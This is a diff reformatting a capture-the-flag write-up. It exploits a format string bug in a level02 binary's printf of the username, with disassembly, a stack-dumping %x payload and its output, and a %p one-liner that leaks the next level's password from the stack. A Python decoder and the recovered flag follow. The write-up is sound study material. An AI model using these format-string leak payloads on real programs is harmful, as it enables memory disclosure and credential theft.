@@ -1,46 +1,45 @@
 # Format string attack again
-On this level we have another authentication system, we notice on theses lines that our program recovers the password from the next level to write it on the stack :
 
-    0000000000400814 <main>:
-    ...
-    40089d:	b8 b2 0b 40 00       	mov    $0x400bb2,%eax
-    4008a2:	48 89 d6             	mov    %rdx,%rsi
-    4008a5:	48 89 c7             	mov    %rax,%rdi
-    4008a8:	e8 53 fe ff ff       	callq  400700 <fopen@plt>
-    ...
-    4008e6:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
-    4008ed:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
-    4008f1:	48 89 d1             	mov    %rdx,%rcx
-    4008f4:	ba 29 00 00 00       	mov    $0x29,%edx
-    4008f9:	be 01 00 00 00       	mov    $0x1,%esi
-    4008fe:	48 89 c7             	mov    %rax,%rdi
-    400901:	e8 8a fd ff ff       	callq  400690 <fread@plt>
+## Program summary
+On this level we have another authentication system, we notice on theses lines that our program recovers the password from the next level with **`fopen()`** to write it on the stack with **`fread()`** :
 
-
+```
+0000000000400814 <main>:
+...
+40089d:	b8 b2 0b 40 00       	mov    $0x400bb2,%eax
+4008a2:	48 89 d6             	mov    %rdx,%rsi
+4008a5:	48 89 c7             	mov    %rax,%rdi
+4008a8:	e8 53 fe ff ff       	callq  400700 <fopen@plt>
+...
+4008e6:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
+4008ed:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
+4008f1:	48 89 d1             	mov    %rdx,%rcx
+4008f4:	ba 29 00 00 00       	mov    $0x29,%edx
+4008f9:	be 01 00 00 00       	mov    $0x1,%esi
+4008fe:	48 89 c7             	mov    %rax,%rdi
+400901:	e8 8a fd ff ff       	callq  400690 <fread@plt>
+```
 Content of **0x400bb2** :
+```
+(gdb) x/s 0x400bb2
+0x400bb2:        "/home/users/level03/.pass"
+```
 
-    (gdb) x/s 0x400bb2
-    0x400bb2:        "/home/users/level03/.pass"
-
-
-
-
-
-Subsequently we can notice a **`printf()`** which prints the username, therefore an entry from us.
+## Vulnerability
+We can notice a **`printf()`** which prints the username, therefore an entry from us.
 
 Since the password resides on the stack and **`printf()`** is vulnerable to format string attacks, we'll use it to read into memory this time.
 
+## Attack design
  The **$RSP** has been subtracted from **0x120** Bytes at the prolog, and the contents of the next level password are set to **` $RBP-0xa0`**,  so we need to determine an offset. To do this, we know that the buffer that **`printf()`** uses starts at **` $RBP-0x70`**, so if we guess the position of this buffer in the stack, we could calculate the exact position of the password located at **` $RBP-0xa0`**.
 
 The stack frame contains in the 28th position our buffer from the start at the time of printf execution.
 
+```
+--[ Username: AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x 
 
-
-    --[ Username: AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x 
-
-    AAAA ffffe3d0 0 61 2a2a2a2a 2a2a2a2a ffffe5c8 f7ff9a08 647361 0 0 0 0 0 0 0 0 0 0 0 0 0 34376848 61733951 574e6758 6e475873 664b394d 0 41414141 25207825 20782520 78252078  does not have access!
-
-
+AAAA ffffe3d0 0 61 2a2a2a2a 2a2a2a2a ffffe5c8 f7ff9a08 647361 0 0 0 0 0 0 0 0 0 0 0 0 0 34376848 61733951 574e6758 6e475873 664b394d 0 41414141 25207825 20782520 78252078  does not have access!
+```
 
 ```
 |---------------------|
@@ -65,10 +64,11 @@ Given that between the buffer & password location we have a space of 48 bytes, w
 
 Here is the python script which allows us to convert the hexa little endian format into our flag.
 
+
+
 ```py
 python -c 'print "%26$p %25$p %24$p %23$p %22$p\n"' | ./level02
 ```
-
 
 ```py
 def little_endian_to_big_endian(hex_string):
@@ -101,4 +101,4 @@ print("Concatenated ASCII: ", concatenated_ascii)
 
 ```
 
-> flag : Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+> Flag : `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
